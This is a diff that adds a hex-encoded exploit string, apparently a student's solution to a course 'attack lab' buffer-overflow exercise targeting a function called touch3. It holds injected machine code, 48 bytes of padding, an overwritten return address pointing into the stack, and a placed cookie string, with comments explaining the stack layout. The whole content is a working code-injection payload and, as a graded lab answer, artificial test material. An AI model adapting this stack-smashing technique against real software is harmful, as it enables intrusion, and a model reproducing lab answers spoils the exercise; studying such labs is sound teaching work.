@@ -1,0 +1,13 @@
+48 c7 c7 40 e6 61 55 c3  /*address location of cookie - ascii rep 0x11560ebd */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+30 30 30 30 30 30 30 30 /* padding 48 bytes */
+f8 e5 61 55 00 00 00 00 /* return address of $rsp */
+8f 16 40 00 00 00 00 00 /* touch3 address */
+31 31 35 36 30 65 62 64 00 /* acii rep of 0x11560ebd placed after touch 3 so it wont get rewritten from hexmatch*/ 
+
+
+/* address of cookie is going to be located at 0x5561e5f8(rsp address of rdi) + 0x48 0x48 = 0x38(buffer) +0x8(return address of rsp) + 0x8(address for touch3)
